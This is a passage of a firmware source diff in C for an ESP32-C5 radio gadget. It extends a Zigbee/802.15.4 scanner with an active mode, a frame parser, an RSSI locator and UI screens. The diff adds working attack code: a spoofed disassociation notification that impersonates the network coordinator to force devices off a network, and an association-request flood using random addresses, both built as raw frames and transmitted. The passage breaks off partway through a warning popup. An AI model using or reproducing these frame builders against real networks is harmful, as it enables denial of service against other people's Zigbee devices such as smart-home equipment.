@@ -1605,18 +1605,32 @@ EXT_RAM_BSS_ATTR static lv_obj_t *s_n24_jam_status = NULL;
 EXT_RAM_BSS_ATTR static lv_timer_t *s_n24_jam_tmr = NULL;
 EXT_RAM_BSS_ATTR static TaskHandle_t s_n24_jam_task = NULL;
 
-// ── Zigbee Scout (passive 802.15.4 wardrive, built-in ESP32-C5 radio) ────────
-#define ZGWD_DWELL_MS      250   // ms to receive on each channel
-#define ZGWD_MAX_PANS       64   // unique PAN IDs tracked
-#define ZGWD_Q_DEPTH        24   // ISR→task frame queue depth
+// ── Zigbee Scout (passive/active 802.15.4 scanner, built-in ESP32-C5 radio) ──
+#define ZGWD_DWELL_MS        250   // ms to receive on each channel
+#define ZGWD_MAX_PANS         64   // unique PAN IDs tracked
+#define ZGWD_Q_DEPTH          24   // ISR→task frame queue depth
+#define ZGWD_MAX_DEVS_PER_PAN 16   // short addresses tracked per PAN
 #define ZGWD_SAVE_DIR  "/sdcard/lab/zigbee"
+
+// Frame type bitmask flags
+#define ZGWD_FT_BEACON  0x01
+#define ZGWD_FT_DATA    0x02
+#define ZGWD_FT_ACK     0x04
+#define ZGWD_FT_CMD     0x08
 
 typedef struct {
     uint16_t pan_id;
     uint8_t  channel;
     int8_t   rssi_min;
     int8_t   rssi_max;
+    uint8_t  frame_types;                      // bitmask: ZGWD_FT_*
     uint16_t frame_count;
+    uint64_t ext_pan_id;                       // from beacon payload (0=unknown)
+    uint8_t  stack_profile;                    // 0=unknown,1=Zigbee,2=ZigbeePRO
+    bool     router_cap;
+    bool     end_dev_cap;
+    uint8_t  device_count;
+    uint16_t devices[ZGWD_MAX_DEVS_PER_PAN];   // unique short addrs seen
 } zgwd_pan_entry_t;
 
 typedef struct {
@@ -1629,10 +1643,12 @@ typedef struct {
 
 typedef struct {
     lv_obj_t    *status_lbl;
-    lv_obj_t    *pan_list;      // scrollable PAN list (Observer-style)
-    lv_obj_t    *start_btn;
+    lv_obj_t    *pan_list;
+    lv_obj_t    *passive_btn;
+    lv_obj_t    *active_btn;
     lv_timer_t  *tmr;
-    bool         active;
+    bool         scanning;
+    bool         active_mode;
     volatile bool cancel;
     TaskHandle_t task;
     int          frame_count;
@@ -1643,8 +1659,36 @@ typedef struct {
     char         pcap_path[80];
 } zgwd_ctx_t;
 
-EXT_RAM_BSS_ATTR static zgwd_ctx_t *s_zgwd = NULL;
-static QueueHandle_t s_zgwd_rx_q = NULL;
+// RSSI locator sub-context (allocated when locator screen opens)
+typedef struct {
+    lv_obj_t    *rssi_bar;
+    lv_obj_t    *rssi_lbl;
+    lv_obj_t    *pan_lbl;
+    lv_timer_t  *tmr;
+    int          pan_idx;
+    int8_t       last_rssi;
+    uint8_t      channel;
+    bool         running;
+} zgwd_loc_ctx_t;
+
+// Association flood sub-context
+typedef struct {
+    lv_obj_t    *count_lbl;
+    lv_obj_t    *stop_btn;
+    lv_timer_t  *tmr;
+    TaskHandle_t task;
+    volatile bool cancel;
+    uint16_t     pan_id;
+    uint8_t      channel;
+    int          sent;
+} zgwd_flood_ctx_t;
+
+EXT_RAM_BSS_ATTR static zgwd_ctx_t      *s_zgwd      = NULL;
+EXT_RAM_BSS_ATTR static zgwd_loc_ctx_t  *s_zgwd_loc  = NULL;
+EXT_RAM_BSS_ATTR static zgwd_flood_ctx_t *s_zgwd_fld = NULL;
+static QueueHandle_t  s_zgwd_rx_q  = NULL;
+static SemaphoreHandle_t s_zgwd_tx_sem = NULL;
+static uint8_t s_zgwd_seq = 0;   // rolling MAC sequence number
 
 // AirTag Scanner state
 static TaskHandle_t airtag_scan_task_handle = NULL;
@@ -1978,6 +2022,9 @@ static void show_nrf24_saved_screen(void);
 static void show_nrf24_jammer_screen(void);
 static void show_nrf24_futaba_screen(void);
 static void show_zigbee_wardrive_screen(void);
+static void show_zgwd_pan_detail(int pan_idx);
+static void show_zgwd_locator(int pan_idx);
+static void show_zgwd_flood(int pan_idx);
 static void show_ir_capture_screen(void);
 static void show_ir_replay_screen(void);
 static void show_ir_signal_list_screen(void);
@@ -2157,10 +2204,21 @@ static void reset_function_page_children(void) {
     if (s_n24_jam_tmr) { lv_timer_del(s_n24_jam_tmr); s_n24_jam_tmr = NULL; }
     // Zigbee Scout cleanup — main thread owns the free (task only sets task=NULL)
     if (s_zgwd) {
-        s_zgwd->cancel = true; s_zgwd->active = false;
-        s_zgwd->status_lbl = NULL; s_zgwd->pan_list = NULL; s_zgwd->start_btn = NULL;
+        s_zgwd->cancel = true; s_zgwd->scanning = false;
+        s_zgwd->status_lbl = NULL; s_zgwd->pan_list = NULL;
+        s_zgwd->passive_btn = NULL; s_zgwd->active_btn = NULL;
         if (s_zgwd->tmr) { lv_timer_del(s_zgwd->tmr); s_zgwd->tmr = NULL; }
         if (!s_zgwd->task) { heap_caps_free(s_zgwd); s_zgwd = NULL; }
+    }
+    if (s_zgwd_loc) {
+        s_zgwd_loc->running = false;
+        if (s_zgwd_loc->tmr) { lv_timer_del(s_zgwd_loc->tmr); s_zgwd_loc->tmr = NULL; }
+        heap_caps_free(s_zgwd_loc); s_zgwd_loc = NULL;
+    }
+    if (s_zgwd_fld) {
+        s_zgwd_fld->cancel = true;
+        if (s_zgwd_fld->tmr) { lv_timer_del(s_zgwd_fld->tmr); s_zgwd_fld->tmr = NULL; }
+        if (!s_zgwd_fld->task) { heap_caps_free(s_zgwd_fld); s_zgwd_fld = NULL; }
     }
     deauth_monitor_rec_label = NULL;
     bt_locator_content = NULL;
@@ -41593,7 +41651,7 @@ static void show_rf433_signal_list_screen(void)
 static IRAM_ATTR void s_zgwd_rx_done_cb(uint8_t *frame,
                                          esp_ieee802154_frame_info_t *fi)
 {
-    if (!s_zgwd_rx_q || !s_zgwd || !s_zgwd->active) {
+    if (!s_zgwd_rx_q || !s_zgwd || !s_zgwd->scanning) {
         esp_ieee802154_receive_handle_done(frame);
         return;
     }
@@ -41625,7 +41683,14 @@ void IRAM_ATTR esp_ieee802154_receive_done(uint8_t *frame,
 void IRAM_ATTR esp_ieee802154_receive_sfd_done(void) {}
 void IRAM_ATTR esp_ieee802154_transmit_done(const uint8_t *f, const uint8_t *a,
                                              esp_ieee802154_frame_info_t *i)
-{ (void)f; (void)a; (void)i; }
+{
+    (void)f; (void)a; (void)i;
+    if (s_zgwd_tx_sem) {
+        BaseType_t woken = pdFALSE;
+        xSemaphoreGiveFromISR(s_zgwd_tx_sem, &woken);
+        portYIELD_FROM_ISR(woken);
+    }
+}
 void IRAM_ATTR esp_ieee802154_transmit_failed(const uint8_t *f,
                                                esp_ieee802154_tx_error_t e)
 { (void)f; (void)e; }
@@ -41657,23 +41722,160 @@ static void s_zgwd_pcap_write_frame(FILE *f, const zgwd_frame_msg_t *msg,
     fwrite(msg->data, 1, msg->len, f);
 }
 
-// ── PAN ID extractor from raw 802.15.4 MAC frame ─────────────────────────────
-static uint16_t s_zgwd_extract_pan(const uint8_t *mac, uint8_t len)
+// ── 802.15.4 frame parser ─────────────────────────────────────────────────────
+typedef struct {
+    uint16_t pan_id;      // 0xFFFF = not found
+    uint16_t src_short;   // 0xFFFF = not present
+    uint64_t src_ext;     // 0 = not present
+    uint64_t ext_pan_id;  // from beacon payload, 0 = not present
+    uint8_t  stack_profile;
+    bool     router_cap;
+    bool     end_dev_cap;
+    uint8_t  frame_type;  // ZGWD_FT_*
+} zgwd_parsed_t;
+
+static void s_zgwd_parse_frame(const uint8_t *mac, uint8_t len, zgwd_parsed_t *out)
 {
-    if (len < 5) return 0xFFFF;
+    memset(out, 0, sizeof(*out));
+    out->pan_id    = 0xFFFF;
+    out->src_short = 0xFFFF;
+    if (len < 3) return;
+
     uint16_t fc = (uint16_t)mac[0] | ((uint16_t)mac[1] << 8);
+    uint8_t  ftype    = fc & 0x07;
     uint8_t  dst_mode = (fc >> 10) & 0x03;
-    if (dst_mode != 0) return (uint16_t)mac[3] | ((uint16_t)mac[4] << 8);
-    return 0xFFFF;
+    uint8_t  src_mode = (fc >> 14) & 0x03;
+    bool     pan_comp = (fc >> 6) & 0x01;
+
+    switch (ftype) {
+        case 0: out->frame_type = ZGWD_FT_BEACON; break;
+        case 1: out->frame_type = ZGWD_FT_DATA;   break;
+        case 2: out->frame_type = ZGWD_FT_ACK;    break;
+        case 3: out->frame_type = ZGWD_FT_CMD;    break;
+        default: out->frame_type = 0;              break;
+    }
+
+    // Walk the MAC header: FC(2) + Seq(1) + addressing fields
+    int off = 3;
+
+    // Destination PAN + address
+    if (dst_mode == 2 || dst_mode == 3) {
+        if (off + 2 > len) return;
+        out->pan_id = (uint16_t)mac[off] | ((uint16_t)mac[off+1] << 8);
+        off += 2;
+        off += (dst_mode == 2) ? 2 : 8; // 16-bit or 64-bit dst addr
+    }
+
+    // Source PAN (omitted if PAN compressed and dst present)
+    uint16_t src_pan = out->pan_id;
+    if (src_mode != 0 && !(pan_comp && dst_mode != 0)) {
+        if (off + 2 > len) return;
+        src_pan = (uint16_t)mac[off] | ((uint16_t)mac[off+1] << 8);
+        if (out->pan_id == 0xFFFF) out->pan_id = src_pan;
+        off += 2;
+    }
+
+    // Source address
+    if (src_mode == 2) {
+        if (off + 2 <= len)
+            out->src_short = (uint16_t)mac[off] | ((uint16_t)mac[off+1] << 8);
+        off += 2;
+    } else if (src_mode == 3) {
+        if (off + 8 <= len) {
+            uint64_t ext = 0;
+            for (int i = 0; i < 8; i++) ext |= ((uint64_t)mac[off+i]) << (8*i);
+            out->src_ext = ext;
+        }
+        off += 8;
+    }
+
+    // Beacon payload: SuperFrame(2) + GTS(1) + Pending(1) + Zigbee beacon(at least 15 bytes)
+    if (ftype == 0 && off + 4 <= len) {
+        off += 4; // skip SuperFrame + GTS + Pending
+        // Zigbee beacon: byte 0 bits[3:0]=StackProfile bits[7:4]=ProtoVer
+        //                byte 1 bit2=RouterCap bit7=EndDevCap
+        //                bytes 2-9 = Extended PAN ID (LE)
+        if (off + 10 <= len) {
+            uint8_t b0 = mac[off];
+            uint8_t b1 = mac[off+1];
+            out->stack_profile = b0 & 0x0F;
+            out->router_cap    = (b1 >> 2) & 1;
+            out->end_dev_cap   = (b1 >> 7) & 1;
+            uint64_t epid = 0;
+            for (int i = 0; i < 8; i++) epid |= ((uint64_t)mac[off+2+i]) << (8*i);
+            out->ext_pan_id = epid;
+        }
+    }
+}
+
+// ── TX helpers (beacon request / disassoc / assoc flood) ─────────────────────
+static void s_zgwd_tx_wait(void)
+{
+    if (s_zgwd_tx_sem) xSemaphoreTake(s_zgwd_tx_sem, pdMS_TO_TICKS(25));
+}
+
+static void s_zgwd_send_beacon_req(void)
+{
+    // Command frame, dst=16-bit broadcast, src=none
+    static uint8_t buf[11];
+    buf[0]  = 10;    // len: 8 MAC + 2 FCS
+    buf[1]  = 0x03;  // FC_LOW: cmd, no ack
+    buf[2]  = 0x08;  // FC_HIGH: dst=16-bit, src=none
+    buf[3]  = s_zgwd_seq++;
+    buf[4]  = 0xFF; buf[5] = 0xFF; // DstPAN broadcast
+    buf[6]  = 0xFF; buf[7] = 0xFF; // DstAddr broadcast
+    buf[8]  = 0x07;  // Beacon Request
+    buf[9]  = 0x00; buf[10] = 0x00; // FCS placeholder
+    esp_ieee802154_transmit(buf, false);
+    s_zgwd_tx_wait();
+}
+
+static void s_zgwd_send_disassoc(uint16_t pan_id, uint16_t dev_addr)
+{
+    // Command frame, ack req, PAN compressed, 16-bit src+dst
+    static uint8_t buf[14];
+    buf[0]  = 13;    // len: 11 MAC + 2 FCS
+    buf[1]  = 0x63;  // FC_LOW: cmd, ack, pan-comp
+    buf[2]  = 0x88;  // FC_HIGH: dst=16-bit, src=16-bit
+    buf[3]  = s_zgwd_seq++;
+    buf[4]  = pan_id & 0xFF; buf[5] = pan_id >> 8; // DstPAN
+    buf[6]  = dev_addr & 0xFF; buf[7] = dev_addr >> 8; // DstAddr
+    buf[8]  = 0x00; buf[9] = 0x00;  // SrcAddr = coordinator (0x0000)
+    buf[10] = 0x03;  // Disassociation Notification
+    buf[11] = 0x01;  // Reason: coord wants device to leave
+    buf[12] = 0x00; buf[13] = 0x00; // FCS placeholder
+    esp_ieee802154_transmit(buf, false);
+    s_zgwd_tx_wait();
+}
+
+static void s_zgwd_send_assoc_req(uint16_t pan_id)
+{
+    // Command frame, ack req, no PAN compress, dst=16-bit, src=64-bit
+    static uint8_t buf[22];
+    buf[0]  = 21;    // len: 19 MAC + 2 FCS
+    buf[1]  = 0x23;  // FC_LOW: cmd, ack req
+    buf[2]  = 0xC8;  // FC_HIGH: dst=16-bit, src=64-bit
+    buf[3]  = s_zgwd_seq++;
+    buf[4]  = pan_id & 0xFF; buf[5] = pan_id >> 8; // DstPAN
+    buf[6]  = 0x00; buf[7] = 0x00; // DstAddr = coordinator
+    buf[8]  = 0xFF; buf[9] = 0xFF; // SrcPAN = unassociated
+    // Random EUI-64 (bytes 10-17)
+    for (int i = 0; i < 8; i++) buf[10+i] = (uint8_t)(esp_random() & 0xFF);
+    buf[10] = 0x02; // locally administered bit
+    buf[18] = 0x01; // Association Request
+    buf[19] = 0x8E; // Capability: FFD, mains, RX-on, alloc addr
+    buf[20] = 0x00; buf[21] = 0x00; // FCS placeholder
+    esp_ieee802154_transmit(buf, false);
+    s_zgwd_tx_wait();
 }
 
 // ── Wardrive background task ──────────────────────────────────────────────────
 static void s_zgwd_task_fn(void *arg)
 {
     zgwd_ctx_t *ctx = (zgwd_ctx_t *)arg;
-    ESP_LOGI(TAG, "[ZGWD] Zigbee Scout started");
+    bool active_mode = ctx->active_mode;
+    ESP_LOGI(TAG, "[ZGWD] Zigbee Scout started mode=%s", active_mode ? "ACTIVE" : "PASSIVE");
 
-    // Ensure save directory
     if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
     struct stat st = {0};
     if (stat("/sdcard/lab", &st) == -1) mkdir("/sdcard/lab", 0777);
@@ -41687,11 +41889,10 @@ static void s_zgwd_task_fn(void *arg)
 
     FILE *csv  = fopen(ctx->csv_path, "w");
     FILE *pcap = fopen(ctx->pcap_path, "wb");
-    if (csv)  fprintf(csv, "timestamp_us,channel,pan_id,rssi,lqi,frame_len\n");
+    if (csv)  fprintf(csv, "timestamp_us,channel,pan_id,rssi,lqi,frame_len,frame_type,ext_pan_id,stack_profile\n");
     if (pcap) s_zgwd_pcap_write_global_hdr(pcap);
     if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
 
-    // Stop WiFi to free the shared RF front-end for 802.15.4
     if (current_radio_mode == RADIO_MODE_WIFI) {
         esp_wifi_set_promiscuous(false);
         esp_wifi_stop();
@@ -41703,7 +41904,9 @@ static void s_zgwd_task_fn(void *arg)
         current_radio_mode = RADIO_MODE_NONE;
     }
 
-    // Initialize 802.15.4
+    if (!s_zgwd_tx_sem)
+        s_zgwd_tx_sem = xSemaphoreCreateBinary();
+
     if (esp_ieee802154_enable() != ESP_OK) {
         ESP_LOGE(TAG, "[ZGWD] 802.15.4 enable failed");
         goto zgwd_done;
@@ -41711,9 +41914,8 @@ static void s_zgwd_task_fn(void *arg)
     esp_ieee802154_set_promiscuous(true);
     esp_ieee802154_set_coordinator(false);
     esp_ieee802154_set_panid(0xFFFF);
-    esp_ieee802154_set_short_address(0xFFFF);
+    esp_ieee802154_set_short_address(0xFFFE);
 
-    // Channel-sweep loop
     const uint8_t channels[] = { 11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 };
     const int     num_ch     = (int)(sizeof(channels)/sizeof(channels[0]));
     int           ch_idx     = 0;
@@ -41725,6 +41927,12 @@ static void s_zgwd_task_fn(void *arg)
         esp_ieee802154_set_channel(ch);
         esp_ieee802154_receive();
 
+        // Active mode: send beacon request then listen
+        if (active_mode) {
+            s_zgwd_send_beacon_req();
+            esp_ieee802154_receive();
+        }
+
         TickType_t deadline = xTaskGetTickCount() + pdMS_TO_TICKS(ZGWD_DWELL_MS);
         while (!ctx->cancel && xTaskGetTickCount() < deadline) {
             zgwd_frame_msg_t msg;
@@ -41732,48 +41940,59 @@ static void s_zgwd_task_fn(void *arg)
                 uint64_t ts = (uint64_t)esp_timer_get_time();
                 ctx->frame_count++;
 
-                // Extract PAN ID
-                uint16_t pan = s_zgwd_extract_pan(msg.data, msg.len);
+                zgwd_parsed_t parsed;
+                s_zgwd_parse_frame(msg.data, msg.len, &parsed);
+                uint16_t pan = parsed.pan_id;
 
-                // Track unique PANs
                 if (pan != 0xFFFF) {
-                    bool found = false;
+                    zgwd_pan_entry_t *pe = NULL;
                     for (int i = 0; i < ctx->pan_count; i++) {
-                        if (ctx->pans[i].pan_id == pan) {
-                            if (msg.rssi < ctx->pans[i].rssi_min) ctx->pans[i].rssi_min = msg.rssi;
-                            if (msg.rssi > ctx->pans[i].rssi_max) ctx->pans[i].rssi_max = msg.rssi;
-                            ctx->pans[i].frame_count++;
-                            found = true;
-                            break;
-                        }
+                        if (ctx->pans[i].pan_id == pan) { pe = &ctx->pans[i]; break; }
                     }
-                    if (!found && ctx->pan_count < ZGWD_MAX_PANS) {
-                        zgwd_pan_entry_t *pe = &ctx->pans[ctx->pan_count++];
-                        pe->pan_id     = pan;
-                        pe->channel    = ch;
-                        pe->rssi_min   = msg.rssi;
-                        pe->rssi_max   = msg.rssi;
-                        pe->frame_count = 1;
+                    if (!pe && ctx->pan_count < ZGWD_MAX_PANS) {
+                        pe = &ctx->pans[ctx->pan_count++];
+                        pe->pan_id    = pan;
+                        pe->channel   = ch;
+                        pe->rssi_min  = msg.rssi;
+                        pe->rssi_max  = msg.rssi;
+                    }
+                    if (pe) {
+                        if (msg.rssi < pe->rssi_min) pe->rssi_min = msg.rssi;
+                        if (msg.rssi > pe->rssi_max) pe->rssi_max = msg.rssi;
+                        pe->frame_count++;
+                        pe->frame_types |= parsed.frame_type;
+                        // Beacon payload enrichment
+                        if (parsed.frame_type == ZGWD_FT_BEACON && parsed.ext_pan_id) {
+                            pe->ext_pan_id    = parsed.ext_pan_id;
+                            pe->stack_profile = parsed.stack_profile;
+                            pe->router_cap    = parsed.router_cap;
+                            pe->end_dev_cap   = parsed.end_dev_cap;
+                        }
+                        // Track unique short addresses
+                        if (parsed.src_short != 0xFFFF && pe->device_count < ZGWD_MAX_DEVS_PER_PAN) {
+                            bool dup = false;
+                            for (int d = 0; d < pe->device_count; d++) {
+                                if (pe->devices[d] == parsed.src_short) { dup = true; break; }
+                            }
+                            if (!dup) pe->devices[pe->device_count++] = parsed.src_short;
+                        }
                     }
                 }
 
                 if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5));
                 if (csv) {
-                    if (pan != 0xFFFF)
-                        fprintf(csv, "%llu,%u,0x%04X,%d,%u,%u\n",
-                                (unsigned long long)ts, ch, pan,
-                                (int)msg.rssi, (unsigned)msg.lqi, (unsigned)msg.len);
-                    else
-                        fprintf(csv, "%llu,%u,--,%d,%u,%u\n",
-                                (unsigned long long)ts, ch,
-                                (int)msg.rssi, (unsigned)msg.lqi, (unsigned)msg.len);
+                    fprintf(csv, "%llu,%u,0x%04X,%d,%u,%u,%u,%llu,%u\n",
+                            (unsigned long long)ts, ch, (unsigned)pan,
+                            (int)msg.rssi, (unsigned)msg.lqi, (unsigned)msg.len,
+                            (unsigned)parsed.frame_type,
+                            (unsigned long long)parsed.ext_pan_id,
+                            (unsigned)parsed.stack_profile);
                 }
                 if (pcap) s_zgwd_pcap_write_frame(pcap, &msg, ts);
                 if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
             }
         }
 
-        // Flush to SD every 16 channels
         if ((ch_idx & 0x0F) == 0x0F) {
             if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(10));
             if (csv)  fflush(csv);
@@ -41793,19 +42012,50 @@ zgwd_done:
     if (pcap) { fflush(pcap); fclose(pcap); }
     if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
 
-    // Restart WiFi
     ensure_wifi_mode();
     apply_wifi_power_settings();
 
-    ESP_LOGI(TAG, "[ZGWD] Stopped. Frames:%d PANs:%d",
-             ctx->frame_count, ctx->pan_count);
+    ESP_LOGI(TAG, "[ZGWD] Stopped. Frames:%d PANs:%d", ctx->frame_count, ctx->pan_count);
 
-    ctx->active = false;
-    ctx->task   = NULL;  // signal main thread; reset_function_page_children owns the free
+    ctx->scanning = false;
+    ctx->task     = NULL;
     vTaskDelete(NULL);
 }
 
-// ── UI timer (updates display while scanning) ─────────────────────────────────
+// Saved copy of selected PAN for detail/locator/flood screens
+static zgwd_pan_entry_t s_zgwd_sel_pan;
+
+// ── Helpers to make/style a small button ─────────────────────────────────────
+static lv_obj_t *s_zgwd_make_btn(lv_obj_t *parent, const char *label,
+                                  lv_color_t bg, lv_align_t align,
+                                  lv_coord_t x, lv_coord_t y,
+                                  lv_coord_t w, lv_coord_t h)
+{
+    lv_obj_t *btn = lv_btn_create(parent);
+    lv_obj_set_size(btn, w, h);
+    lv_obj_align(btn, align, x, y);
+    lv_obj_set_style_bg_color(btn, bg, LV_STATE_DEFAULT);
+    lv_obj_set_style_border_width(btn, 0, 0);
+    lv_obj_set_style_radius(btn, 6, 0);
+    lv_obj_t *lbl = lv_label_create(btn);
+    lv_label_set_text(lbl, label);
+    lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(lbl, lv_color_white(), 0);
+    lv_obj_center(lbl);
+    return btn;
+}
+
+// ── Card tap → PAN detail ─────────────────────────────────────────────────────
+static void s_zgwd_card_tap_cb(lv_event_t *e)
+{
+    int idx = (int)(uintptr_t)lv_event_get_user_data(e);
+    zgwd_ctx_t *ctx = s_zgwd;
+    if (!ctx || idx < 0 || idx >= ctx->pan_count) return;
+    s_zgwd_sel_pan = ctx->pans[idx];   // copy before navigation clears s_zgwd
+    show_zgwd_pan_detail(idx);
+}
+
+// ── UI timer ──────────────────────────────────────────────────────────────────
 static void s_zgwd_ui_timer_cb(lv_timer_t *t)
 {
     (void)t;
@@ -41813,12 +42063,13 @@ static void s_zgwd_ui_timer_cb(lv_timer_t *t)
     if (!ctx) return;
 
     if (ctx->status_lbl) {
-        char sb[52];
-        if (ctx->active)
-            snprintf(sb, sizeof(sb), "Ch %u  Frames: %d  PANs: %d",
+        char sb[64];
+        if (ctx->scanning)
+            snprintf(sb, sizeof(sb), "%s Ch%u  Fr:%d  PANs:%d",
+                     ctx->active_mode ? "[ACTIVE]" : "[PASS]",
                      ctx->current_channel, ctx->frame_count, ctx->pan_count);
         else
-            snprintf(sb, sizeof(sb), "Stopped  Frames: %d  PANs: %d",
+            snprintf(sb, sizeof(sb), "Stopped  Fr:%d  PANs:%d",
                      ctx->frame_count, ctx->pan_count);
         lv_label_set_text(ctx->status_lbl, sb);
     }
@@ -41827,7 +42078,7 @@ static void s_zgwd_ui_timer_cb(lv_timer_t *t)
         lv_obj_clean(ctx->pan_list);
         if (ctx->pan_count == 0) {
             lv_obj_t *hint = lv_label_create(ctx->pan_list);
-            lv_label_set_text(hint, ctx->active ? "Scanning..." : "No PANs detected");
+            lv_label_set_text(hint, ctx->scanning ? "Scanning..." : "No PANs detected");
             lv_obj_set_style_text_font(hint, &lv_font_montserrat_12, 0);
             lv_obj_set_style_text_color(hint, lv_color_make(120, 120, 120), 0);
         }
@@ -41842,11 +42093,17 @@ static void s_zgwd_ui_timer_cb(lv_timer_t *t)
             lv_obj_set_style_border_color(card, lv_color_hex(0x00695C), 0);
             lv_obj_set_style_bg_color(card, ui_card_color(), 0);
             lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
+            lv_obj_add_flag(card, LV_OBJ_FLAG_CLICKABLE);
             lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
+            lv_obj_add_event_cb(card, s_zgwd_card_tap_cb, LV_EVENT_CLICKED,
+                                (void*)(uintptr_t)i);
 
-            char r1[40];
-            snprintf(r1, sizeof(r1), "PAN 0x%04X  Ch %u  %u frm",
-                     pe->pan_id, pe->channel, (unsigned)pe->frame_count);
+            // Row 1: PAN ID + channel + frame count
+            const char *sp = pe->stack_profile == 1 ? " ZB" :
+                             pe->stack_profile == 2 ? " PRO" : "";
+            char r1[48];
+            snprintf(r1, sizeof(r1), "PAN 0x%04X  Ch%u  %u frm%s",
+                     pe->pan_id, pe->channel, (unsigned)pe->frame_count, sp);
             lv_obj_t *l1 = lv_label_create(card);
             lv_label_set_text(l1, r1);
             lv_obj_set_style_text_font(l1, &lv_font_montserrat_12, 0);
@@ -41854,9 +42111,13 @@ static void s_zgwd_ui_timer_cb(lv_timer_t *t)
             lv_label_set_long_mode(l1, LV_LABEL_LONG_CLIP);
             lv_obj_set_width(l1, lv_pct(100));
 
-            char r2[32];
-            snprintf(r2, sizeof(r2), "RSSI %d..%d dBm",
-                     (int)pe->rssi_min, (int)pe->rssi_max);
+            // Row 2: RSSI + device count + router/enddev flags
+            char r2[48];
+            snprintf(r2, sizeof(r2), "RSSI %d..%d  Devs:%u%s%s",
+                     (int)pe->rssi_min, (int)pe->rssi_max,
+                     (unsigned)pe->device_count,
+                     pe->router_cap    ? " R" : "",
+                     pe->end_dev_cap   ? " E" : "");
             lv_obj_t *l2 = lv_label_create(card);
             lv_label_set_text(l2, r2);
             lv_obj_set_style_text_font(l2, &lv_font_montserrat_12, 0);
@@ -41866,88 +42127,165 @@ static void s_zgwd_ui_timer_cb(lv_timer_t *t)
         }
     }
 
-    if (!ctx->active && ctx->start_btn) {
-        lv_obj_t *lbl = lv_obj_get_child(ctx->start_btn, 0);
-        if (lbl) lv_label_set_text(lbl, LV_SYMBOL_PLAY "  Start");
+    // Restore buttons when scan stops
+    if (!ctx->scanning) {
+        if (ctx->passive_btn) {
+            lv_obj_t *lbl = lv_obj_get_child(ctx->passive_btn, 0);
+            if (lbl) lv_label_set_text(lbl, LV_SYMBOL_PLAY "  Passive");
+            lv_obj_clear_state(ctx->passive_btn, LV_STATE_DISABLED);
+        }
+        if (ctx->active_btn) {
+            lv_obj_clear_state(ctx->active_btn, LV_STATE_DISABLED);
+        }
     }
 }
 
-// ── Start / Stop callback ─────────────────────────────────────────────────────
-static void s_zgwd_startstop_cb(lv_event_t *e)
+// ── Passive / Active / Stop callbacks ────────────────────────────────────────
+static void s_zgwd_start(zgwd_ctx_t *ctx, bool active_mode)
+{
+    if (ctx->scanning || ctx->task) return;
+    ctx->scanning    = true;
+    ctx->active_mode = active_mode;
+    ctx->cancel      = false;
+    ctx->frame_count = 0;
+    ctx->pan_count   = 0;
+    memset(ctx->pans, 0, sizeof(ctx->pans));
+    if (ctx->pan_list && lv_obj_is_valid(ctx->pan_list))
+        lv_obj_clean(ctx->pan_list);
+    // Disable both buttons while scanning; passive btn becomes Stop
+    if (ctx->passive_btn) {
+        lv_obj_t *lbl = lv_obj_get_child(ctx->passive_btn, 0);
+        if (lbl) lv_label_set_text(lbl, LV_SYMBOL_STOP "  Stop");
+    }
+    if (ctx->active_btn)
+        lv_obj_add_state(ctx->active_btn, LV_STATE_DISABLED);
+    xTaskCreate(s_zgwd_task_fn, "zgwd", 4096, ctx, 2, &ctx->task);
+}
+
+static void s_zgwd_passive_cb(lv_event_t *e)
 {
     (void)e;
     zgwd_ctx_t *ctx = s_zgwd;
     if (!ctx) return;
-
-    if (!ctx->active && !ctx->task) {
-        // Start
-        ctx->active  = true;
-        ctx->cancel  = false;
-        ctx->frame_count = 0;
-        ctx->pan_count   = 0;
-        memset(ctx->pans, 0, sizeof(ctx->pans));
-        if (ctx->pan_list && lv_obj_is_valid(ctx->pan_list))
-            lv_obj_clean(ctx->pan_list);
-        if (ctx->start_btn) {
-            lv_obj_t *lbl = lv_obj_get_child(ctx->start_btn, 0);
-            if (lbl) lv_label_set_text(lbl, LV_SYMBOL_STOP "  Stop");
-        }
-        xTaskCreate(s_zgwd_task_fn, "zgwd", 4096, ctx, 2, &ctx->task);
+    if (ctx->scanning) {
+        ctx->cancel   = true;
+        ctx->scanning = false;
     } else {
-        // Stop
-        ctx->cancel = true;
-        ctx->active = false;
+        s_zgwd_start(ctx, false);
     }
 }
 
-// ── Back button callback — stop scan then go home ─────────────────────────────
+static void s_zgwd_popup_dismiss_cb(lv_event_t *e)
+{
+    lv_obj_t *popup = (lv_obj_t *)lv_event_get_user_data(e);
+    if (popup && lv_obj_is_valid(popup)) lv_obj_del(popup);
+}
+
+static void s_zgwd_active_disclaimer_ok_cb(lv_event_t *e)
+{
+    lv_obj_t *popup = (lv_obj_t *)lv_event_get_user_data(e);
+    lv_obj_del(popup);
+    zgwd_ctx_t *ctx = s_zgwd;
+    if (ctx) s_zgwd_start(ctx, true);
+}
+
+static void s_zgwd_active_cb(lv_event_t *e)
+{
+    (void)e;
+    zgwd_ctx_t *ctx = s_zgwd;
+    if (!ctx || ctx->scanning) return;
+
+    // Disclaimer popup
+    lv_obj_t *popup = lv_obj_create(lv_scr_act());
+    lv_obj_set_size(popup, 220, 160);
+    lv_obj_center(popup);
+    lv_obj_set_style_bg_color(popup, lv_color_hex(0x1A1A1A), 0);
+    lv_obj_set_style_border_color(popup, lv_color_hex(0xB71C1C), 0);
+    lv_obj_set_style_border_width(popup, 2, 0);
+    lv_obj_set_style_radius(popup, 8, 0);
+    lv_obj_set_style_pad_all(popup, 10, 0);
+    lv_obj_clear_flag(popup, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *ttl = lv_label_create(popup);
+    lv_label_set_text(ttl, "! ACTIVE SCAN WARNING");
+    lv_obj_set_style_text_font(ttl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(ttl, lv_color_hex(0xEF5350), 0);
+    lv_obj_align(ttl, LV_ALIGN_TOP_MID, 0, 0);
+
